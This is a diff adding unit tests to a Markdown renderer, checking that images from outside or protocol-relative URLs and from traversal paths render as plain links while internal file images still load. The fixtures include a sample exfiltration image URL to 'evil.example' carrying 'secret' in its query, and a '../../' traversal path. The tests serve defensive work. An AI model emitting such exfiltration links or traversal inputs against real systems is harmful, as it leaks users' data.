@@ -36,3 +36,43 @@ test("a dash list renders list items", () => {
   expect(html).toContain("<li>a</li>");
   expect(html).toContain("<li>b</li>");
 });
+
+test("images from absolute URLs render as links, not images", () => {
+  const html = renderToStaticMarkup(
+    <Markdown>{"![x](https://evil.example/a.png?d=secret)"}</Markdown>
+  );
+  expect(html).not.toContain("<img");
+  expect(html).toContain(
+    '<a class="underline underline-offset-2" href="https://evil.example/a.png?d=secret"'
+  );
+  expect(html).toContain(">https://evil.example/a.png?d=secret</a>");
+});
+
+test("Harbourmaster file images render as images", () => {
+  const html = renderToStaticMarkup(
+    <Markdown>{"![x](/files/abc123)"}</Markdown>
+  );
+  expect(html).toContain("<img");
+  expect(html).toContain('src="/files/abc123"');
+});
+
+test("library download images render as images", () => {
+  const html = renderToStaticMarkup(
+    <Markdown>{"![x](/api/library/download?path=a.png)"}</Markdown>
+  );
+  expect(html).toContain("<img");
+});
+
+test("protocol-relative image URLs render as links", () => {
+  const html = renderToStaticMarkup(
+    <Markdown>{"![x](//evil.example/a.png)"}</Markdown>
+  );
+  expect(html).not.toContain("<img");
+});
+
+test("file image paths with extra segments render as links", () => {
+  const html = renderToStaticMarkup(
+    <Markdown>{"![x](/files/abc/../../x)"}</Markdown>
+  );
+  expect(html).not.toContain("<img");
+});
